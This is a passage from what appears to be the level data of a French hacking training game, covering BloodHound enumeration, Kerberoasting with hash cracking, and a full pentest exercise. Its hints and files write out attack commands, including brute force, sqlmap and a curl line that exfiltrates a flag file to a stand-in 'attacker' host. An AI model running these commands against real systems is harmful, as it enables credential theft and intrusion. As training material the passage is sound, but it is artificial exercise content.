      'bloodhound_intro.txt': `=== INTRODUCTION À BLOODHOUND ===

QU'EST-CE QUE BLOODHOUND ?
  BloodHound est un outil d'analyse des chemins d'attaque dans Active Directory.
  Il utilise la théorie des graphes pour visualiser les relations entre
  utilisateurs, groupes, ordinateurs et les chemins vers DA (Domain Admin).

PRINCIPE :
  1. Collecte : SharpHound (C#) ou BloodHound.py collecte les données AD
  2. Import : les données JSON sont importées dans Neo4j (base de graphes)
  3. Analyse : BloodHound GUI visualise les chemins d'attaque

COLLECTE AVEC BLOODHOUND.PY (depuis Linux) :
  bloodhound-python -d domain.local -u john -p Password123 \
                    -ns 10.0.0.10 -c All

  Options de collection :
    -c All        : tout collecter (DCOnly pour moins de bruit)
    --dns-tcp     : forcer DNS sur TCP
    --zip         : compresser les résultats

REQUÊTES CYPHER UTILES (dans BloodHound) :
  # Chemin le plus court vers Domain Admins
  MATCH p=shortestPath((n:User {name:"JOHN@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

  # Tous les comptes Kerberoastables
  MATCH (u:User {hasspn:true}) RETURN u.name

  # Ordinateurs joignables depuis l'utilisateur courant
  MATCH (u:User {name:"JOHN@CORP.LOCAL"}),(c:Computer),p=shortestPath((u)-[*1..]->(c)) RETURN p

ALERTES COMMUNES BLOODHOUND :
  → Kerberoastable accounts    : SPN sur des comptes utilisateurs
  → AS-REP Roastable accounts  : comptes sans pré-auth Kerberos
  → DCSync rights              : droit de répliquer le domaine (==domain takeover)
  → AdminTo edges              : qui est admin local sur quoi`
    },
    validation: [
      { type: 'command', value: 'ldapsearch', description: 'Enumérer Active Directory avec ldapsearch' }
    ],
    story: "🏢 Tu es dans le réseau d'une entreprise avec un compte utilisateur basique. LDAP te donne la carte complète de l'Active Directory : tous les utilisateurs, leurs groupes, leurs SPNs. BloodHound transforme cette carte en chemin direct vers Domain Admin."
  },
  {
    id: 149,
    title: "Kerberoasting",
    difficulty: 'advanced',
    category: "Post-Exploitation",
    objective: "Comprendre et simuler une attaque Kerberoasting",
    description: "Le Kerberoasting exploite la façon dont Kerberos délivre des tickets de service (TGS). Tout utilisateur authentifié peut demander un TGS pour n'importe quel Service Principal Name (SPN). Ce ticket est chiffré avec le hash NTLM du compte de service associé — et peut donc être craqué offline sans contact avec le DC. Les comptes de service avec des SPNs et des mots de passe faibles sont les cibles idéales. L'attaque ne génère qu'un événement 4769 dans les logs Windows, facilement noyé dans le trafic légitime.",
    commands: ['python3', 'john', 'hashcat'],
    hints: [
      "Lister les SPNs et demander les tickets : python3 GetUserSPNs.py domain.local/user:password -dc-ip 10.0.0.10 -outputfile hashes.txt",
      "Cracker avec john : john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs",
      "Cracker avec hashcat : hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt (mode 13100 = Kerberos TGS-REP)"
    ],
    fileSystem: {
      'kerberoasting_explained.txt': `=== KERBEROASTING — EXPLICATION COMPLÈTE ===

QU'EST-CE QU'UN SPN (Service Principal Name) ?
  Un SPN identifie de manière unique un service dans un domaine AD.
  Format : serviceType/hostname:port
  Exemples :
    MSSQLSvc/sqlserver.corp.local:1433   (SQL Server)
    HTTP/webapp.corp.local               (IIS)
    FTPSvc/ftpserver.corp.local          (FTP)

COMMENT FONCTIONNE L'ATTAQUE ?

  Étape 1 : Trouver les comptes avec SPN
    → Tout utilisateur authentifié peut faire cette requête LDAP
    → GetUserSPNs.py ou ldapsearch (objectClass=user)(servicePrincipalName=*)

  Étape 2 : Demander un TGS pour le SPN
    → Kerberos délivre un ticket chiffré avec le hash NTLM du compte de service
    → Cette requête est LÉGITIME — n'importe quel utilisateur peut la faire

  Étape 3 : Extraire le ticket
    → Le TGS est dans le format $krb5tgs$23$*...
    → Contient des données chiffrées avec RC4 (NTLM) ou AES selon la config

  Étape 4 : Craquage offline
    → Aucun contact avec le DC nécessaire
    → Si le compte de service a un mot de passe faible → compromis !

POURQUOI C'EST DANGEREUX ?
  Les comptes de service ont souvent :
  - Des mots de passe anciens (personne ne les change)
  - Des mots de passe "enterprise" prévisibles : Service2019!, Sqlserver1!
  - Des privilèges élevés (DBAs, service accounts avec admin local)
  - Pas de MFA (c'est un compte de service)

COMMANDE COMPLÈTE (Impacket) :
  # Lister les SPNs sans crédentiels (si null session autorisée)
  python3 GetUserSPNs.py -dc-ip 10.0.0.10 -no-pass -request domain.local/

  # Avec credentials (compte utilisateur basique)
  python3 GetUserSPNs.py corp.local/john:Summer2024! \
          -dc-ip 10.0.0.10 -request -outputfile spn_hashes.txt

  # Résultat : fichier contenant des hashes format
  # $krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sqlserver.corp.local*$...hash...

DÉFENSE :
  - Utiliser des mots de passe longs (25+ chars) pour les comptes de service
  - Activer AES pour Kerberos (pas RC4) → plus difficile à cracker
  - Managed Service Accounts (MSA/gMSA) : mots de passe 240 chars automatiques
  - Alerter sur les événements 4769 (TGS Request) anormaux`,
      'tgs_crack_example.txt': `=== EXEMPLE DE CRAQUAGE D'UN TICKET TGS ===

FORMAT DU HASH TGS (krb5tgs, type 23 = RC4) :
  $krb5tgs$23$*svc_mssql$CORP.LOCAL$MSSQLSvc/sqlserver.corp.local:1433*
  $8b7e2a3f9c4d1e0a5b6f...HASH_TRONQUÉ...$c3d4e5f6a7b8c9d0

AVEC JOHN THE RIPPER :
  # Craquage avec wordlist
  john spn_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs

  # Avec règles (mutations : ajout de chiffres, majuscules)
  john spn_hashes.txt --wordlist=rockyou.txt --format=krb5tgs --rules=InsidePro

  # Voir les mots de passe trouvés
  john --show --format=krb5tgs spn_hashes.txt

AVEC HASHCAT :
  # Mode 13100 = Kerberos 5, etype 23 (RC4-HMAC) TGS-REP
  hashcat -m 13100 spn_hashes.txt rockyou.txt

  # Avec règles hashcat (mutations)
  hashcat -m 13100 spn_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

  # Attaque hybride (wordlist + masque)
  hashcat -m 13100 spn_hashes.txt rockyou.txt -a 6 ?d?d?d?d

  # Mode 19700 = AES256-SHA1 TGS-REP (plus récent, plus sécurisé)
  hashcat -m 19700 spn_hashes.txt rockyou.txt

RÉSULTAT TYPIQUE :
  $krb5tgs$23$...:Summer2024!

  → Le mot de passe du compte svc_mssql est "Summer2024!"
  → Maintenant essayer : net use \\\\sqlserver ou mssqlclient.py svc_mssql@sqlserver

STATISTIQUES RÉELLES :
  Dans les pentests réels, environ 20-30% des tickets TGS se craquent
  en moins d'une heure avec rockyou.txt + règles basiques.`
    },
    validation: [
      { type: 'command', value: 'python3', description: 'Lancer GetUserSPNs.py pour le Kerberoasting' }
    ],
    story: "🎫 Un utilisateur basique du domaine. Une requête LDAP pour trouver les SPNs. Un ticket TGS demandé légitimement à Kerberos. Et offline, hashcat craque le mot de passe du compte SQL Server en 3 minutes. Kerberoasting : l'attaque Active Directory la plus silencieuse."
  },
  {
    id: 150,
    title: "CTF ULTIMATE — L'Opération Complète",
    difficulty: 'advanced',
    category: "CTF",
    objective: "Mener une intrusion complète : recon → exploitation → privesc → exfiltration",
    description: "Le défi ultime qui combine toutes les phases d'un pentest. Commence par la reconnaissance passive et active : scan réseau, fingerprinting web, OSINT. Identifie les vecteurs d'attaque : services vulnérables, injection SQL, credentials faibles. Exploite les failles pour obtenir un accès initial, puis escalade les privilèges. Pivote si nécessaire et exfiltre le flag final. Ce niveau est une simulation fidèle d'un engagement pentest réel — méthodologie PTES, documentation de chaque étape, archivage des preuves.",
    commands: ['nmap', 'gobuster', 'sqlmap', 'hydra', 'find', 'curl'],
    hints: [
      "PHASE 1 — Recon : nmap -sC -sV -oA initial_scan target_ip ; gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,txt",
      "PHASE 2 — Exploitation : tester les endpoints découverts avec sqlmap --forms -u http://target/login ; hydra -L users.txt -P rockyou.txt ssh://target",
      "PHASE 3 — PrivEsc : sudo -l ; find / -perm -4000 2>/dev/null ; cat /etc/crontab ; linpeas.sh",
      "PHASE 4 — Pivot : si la cible est sur plusieurs réseaux, utilise chisel ou ssh -D pour atteindre les segments internes",
      "PHASE 5 — Exfiltration : localise le flag avec find / -name 'flag*' 2>/dev/null ou find / -name '*.txt' -path '*/root/*' 2>/dev/null",
      "DOCUMENTATION : note chaque commande, chaque output intéressant. Un pentest sans rapport ne vaut rien. Utilise tee pour logger : nmap ... | tee nmap_output.txt"
    ],
    fileSystem: {
      'operation_brief.txt': `=== BRIEF OPÉRATIONNEL — OPÉRATION SHADOWGATE ===

CLASSIFICATION : CONFIDENTIEL — Engagement pentest autorisé

CLIENT : InfraCorp S.A.
DATE : Voir autorisation signée
PÉRIMÈTRE AUTORISÉ : 192.168.100.0/24

OBJECTIFS :
  1. Identifier tous les services exposés sur le périmètre
  2. Exploiter les vulnérabilités pour obtenir un accès initial
  3. Escalader les privilèges jusqu'à root/SYSTEM
  4. Tester le pivoting entre segments réseau si applicable
  5. Localiser et exfiltrer le flag de validation : FLAG{...}
  6. Documenter toutes les étapes pour le rapport final

CIBLES IDENTIFIÉES EN PRÉ-ENGAGEMENT :
  192.168.100.10  — Serveur web (HTTP 80, HTTPS 443)
  192.168.100.20  — Serveur de base de données (probable)
  192.168.100.30  — Serveur interne (pas d'accès direct depuis Internet)

RÈGLES D'ENGAGEMENT :
  ✓ Tests actifs autorisés sur 192.168.100.0/24
  ✓ Exploitation des services autorisée
  ✓ Pivoting autorisé vers 10.10.20.0/24 si accès obtenu
  ✗ DDoS interdit
  ✗ Destruction de données interdite
  ✗ Attaques en dehors du périmètre INTERDITES

LIVRABLES ATTENDUS :
  - Rapport exécutif (1 page)
  - Rapport technique détaillé avec preuves (screenshots, outputs)
  - Liste des vulnérabilités avec CVSS scores
  - Recommandations de remédiation
  - Flag de validation

DÉBUT DE L'OPÉRATION : MAINTENANT`,
      'pentest_methodology.txt': `=== MÉTHODOLOGIE PENTEST — KILL CHAIN RÉFÉRENCE ===

PHASE 1 — RECONNAISSANCE
  Passive (sans contact avec la cible) :
    whois target.com
    theHarvester -d target.com -b all
    shodan host target_ip
    Google Dorks : site:target.com filetype:pdf

  Active (contact direct) :
    nmap -sn 192.168.100.0/24           # Découverte d'hôtes
    nmap -sC -sV -O target_ip -oA scan  # Scan complet

PHASE 2 — ENUMÉRATION
  Services web :
    gobuster dir -u http://target -w common.txt
    nikto -h http://target
    curl -I http://target (headers)
    whatweb http://target

  Services réseau :
    nmap -sV -p- target (tous les ports)
    enum4linux target (SMB/Samba)
    ldapsearch (Active Directory)

PHASE 3 — EXPLOITATION
  Web :
    sqlmap -u "http://target/page?id=1" --dbs
    hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
    curl exploitation manuelle (LFI, RFI, SSRF)

  Services :
    searchsploit "Apache 2.4.29" (chercher exploits)
    msfconsole → use exploit/... → run

PHASE 4 — POST-EXPLOITATION & PRIVESC
  Énumération locale :
    id && whoami && hostname
    sudo -l (commandes sudo sans mot de passe ?)
    find / -perm -4000 2>/dev/null (binaires SUID)
    cat /etc/crontab (crons root ?)
    ps aux (processus intéressants ?)
    netstat -tnlp (services internes ?)

  Outils automatiques :
    linpeas.sh (Linux Privilege Escalation Awesome Script)
    linux-smart-enumeration (lse.sh)

PHASE 5 — PIVOTING (si réseau segmenté)
  Identifier les autres réseaux :
    ip route ; ip addr ; cat /etc/hosts

  Créer le tunnel :
    chisel / ssh -D / socat

PHASE 6 — EXFILTRATION & DOCUMENTATION
  Localiser le flag :
    find / -name "flag*" -o -name "root.txt" -o -name "user.txt" 2>/dev/null

  Exfiltrer :
    curl -X POST http://attacker/collect -F "flag=$(cat /root/flag.txt)"

  Documenter :
    screenshot de chaque étape critique
    logger toutes les commandes : script -a pentest_$(date +%Y%m%d).log`,
      'flag_format.txt': `=== FORMAT DU FLAG DE VALIDATION ===

Le flag final est au format standard CTF :
  FLAG{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}

Exemples de noms de fichiers où chercher :
  /root/flag.txt
  /root/root.txt
  /home/*/user.txt
  /var/www/html/flag.php
  /opt/flag
  Dans une base de données : table flags, colonne secret

COMMANDES DE RECHERCHE :
  find / -name "flag*" 2>/dev/null
  find / -name "*.txt" -path "*/root/*" 2>/dev/null
  grep -r "FLAG{" / 2>/dev/null
  find / -user root -readable -name "*.txt" 2>/dev/null

UNE FOIS LE FLAG TROUVÉ :
  1. Copier le contenu exact : cat /root/flag.txt
  2. Screenshot ou log de la commande
  3. Inclure dans le rapport avec le chemin complet
  4. Documenter comment vous y êtes arrivé (proof of concept)

CRITÈRES DE SUCCÈS DE L'OPÉRATION :
  [ ] Accès initial obtenu (shell sur au moins un hôte)
  [ ] Escalade de privilèges réussie (root ou SYSTEM)
  [ ] Flag exfiltré et validé
  [ ] Toutes les étapes documentées
  [ ] Rapport prêt pour le client`
    },
    validation: [
      { type: 'command', value: 'nmap', description: 'Lancer la phase de reconnaissance' },
      { type: 'command', value: 'find', description: 'Rechercher le flag sur le système' }
    ],
    story: "🏆 L'OPÉRATION FINALE. Tu as tout appris : recon passive, scan actif, exploitation web, brute-force, privesc, pivoting. Maintenant prouve-le. Méthodologie PTES, note tout, archive les preuves. Chaque phase compte, chaque commande est une décision. Un vrai pentest commence ici — et se termine avec un rapport, pas juste un flag."
  }
];
